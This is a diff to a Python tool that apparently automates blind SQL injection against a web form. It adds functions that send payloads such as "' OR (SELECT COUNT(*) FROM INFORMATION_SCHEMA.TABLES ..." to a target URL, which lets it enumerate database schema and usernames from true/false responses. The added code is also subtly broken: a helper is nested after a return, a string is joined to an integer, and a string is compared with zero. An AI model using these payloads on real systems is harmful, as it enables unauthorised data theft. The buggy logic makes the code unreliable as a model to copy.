@@ -317,6 +317,10 @@ def userNameLike(ch, url, notLike = False, notLikeName = ""):
       notLikeName: string
          name to exclude from query
 
+   Returns:
+      mhm: boolean
+         true if ch matches a username string in the users table 
+
    """
    payload = "' OR EXISTS(SELECT * FROM users WHERE "
    if(notLike):
@@ -335,6 +339,10 @@ def payloadDictionary(payload, lst):
             SQL query
          lst: List of Strings
             keywords for payload dictionary
+
+      Returns: 
+         dikt: dictionary
+            dictionary using elements of lst as keys and payload as value for each key  
    """
    dikt = {}
    for i in lst:
@@ -396,14 +404,55 @@ def constructTableQuery(ch, index):
    #do I even need the AND ''=' part? it evaluates to '' = '' which is true so true/false AND true? Seems redundant
    return payload
 
-def nTablesMatch():
+def nTablesMatch(n, ch, url, index = "no index"):
    """ how many tables match
+
+   Args:
+      n: integer
+         largest number of tables to check for matches
+      ch: string
+         string to check for matching, ie "k" checks how many tables have a "k" in them
+      url: string
+         url to form
+      index: string or integer
+         if string, must be default, ie "no index"
+         otherwise an integer. Negative integers start from end of string, non-negative integers start from begining. zero is the first character.
+   
+   Returns:
+      N: integer
+         if n is greater than or equal to the number of matching tables, returns the number of matching tables. 
+         Otherwise prints "nTablesMatch found more than n matches for " + ch, then returns n
+
    
    Is there more than one table in the database(s) containing a j?
        "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '%j%')>1 AND ''='"
    
    """   
-   pass
+   for i in range(0, n + 1): # Since range(0,k) is 0 1 ... k-2 k-1
+      if(not tableMatch(i , ch, url, index)):
+         return i# - 1
+
+   print("nTablesMatch found more than n matches for " + ch)
+   return n
+
+   def tableMatch(n, ch, url, index = "no index"):
+   """helper function"""
+   payload = "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '"
+   
+   if(index == "no index"): 
+   # could rewrite this as the else statement, would mean anything but a number would act like no index does here
+      payload += "%" + ch + "%"
+   if(index < 0):
+      index += 1
+      index *= -1
+      payload += "%" + ch + "_" * index 
+   else:
+      payload += index * "_" + ch + "%"
+
+   payload += "')>" + n + " AND ''='"
+   payload = NamePasswordDictionary(payload, "name", "password")
+   txt = sendQuery(payload, url)
+   return readQuery(txt)
 
 
 def characterInDatabaseName(ch, url, index = "no index"):
